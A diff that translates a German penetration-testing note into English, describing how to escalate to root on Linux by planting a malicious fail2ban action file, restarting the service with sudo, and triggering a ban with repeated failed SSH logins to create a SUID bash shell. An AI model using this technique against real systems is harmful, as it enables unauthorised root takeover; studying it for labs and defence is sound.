@@ -3,26 +3,26 @@ tags: [technique, privesc, linux]
 ---
 # fail2ban Abuse
 
-> fail2ban sperrt verdächtige IPs und führt dabei **Action-Befehle als root** aus. Hat man Schreibrecht auf die Action-Config + darf fail2ban (neu)starten → RCE als root.
+> fail2ban blocks suspicious IPs and runs **action commands as root** while doing so. With write access to the action config + permission to (re)start fail2ban → RCE as root.
 
-## Voraussetzungen
-- Schreibrecht im `action.d`-Ordner (oft über eine Gruppe wie `security`):
+## Prerequisites
+- Write access in the `action.d` folder (often via a group like `security`):
 ```bash
 ls -la /etc/fail2ban/action.d/
-# drwxrwx--- root <gruppe>   <- in <gruppe>? => schreiben erlaubt
-sudo -l                      # NOPASSWD auf fail2ban restart
+# drwxrwx--- root <group>   <- in <group>? => writing allowed
+sudo -l                      # NOPASSWD on fail2ban restart
 ```
 
-> [!note] Verzeichnis- vs. Datei-Recht
-> Ordner-Schreibrecht erlaubt umbenennen/erstellen/löschen – **nicht** die root-Datei direkt überschreiben. => In diesem Fall kann man Datei umbenennen, dann neu anlegen.
+> [!note] Directory vs. file permission
+> Folder write access allows renaming/creating/deleting – **not** overwriting the root-owned file directly. => In this case the file can be renamed, then created anew.
 
-## Action-Datei
-fail2ban führt die Shell-Befehle dieser Felder als root aus:
+## Action file
+fail2ban runs the shell commands of these fields as root:
 
-| Feld                           | Wann                        |
+| Field                          | When                        |
 | ------------------------------ | --------------------------- |
-| `actionban`                    | **bei Ban** ← Angriffspunkt |
-| `actionstart/stop/check/unban` | Rest – **leer lassen**      |
+| `actionban`                    | **on ban** ← attack point   |
+| `actionstart/stop/check/unban` | the rest – **leave empty**  |
 
 ## Exploit
 ```bash
@@ -38,8 +38,8 @@ actionunban =
 EOF
 sudo /etc/init.d/fail2ban restart
 ```
-Ban provozieren (mehrere fehlgeschlagene SSH-Logins):
+Provoke a ban (several failed SSH logins):
 ```bash
-for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no bad@<ziel>; done
+for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no bad@<target>; done
 ```
-=> Ban feuert `actionban` als root → SUID-bash → `/tmp/rootbash -p`.
+=> The ban fires `actionban` as root → SUID bash → `/tmp/rootbash -p`.
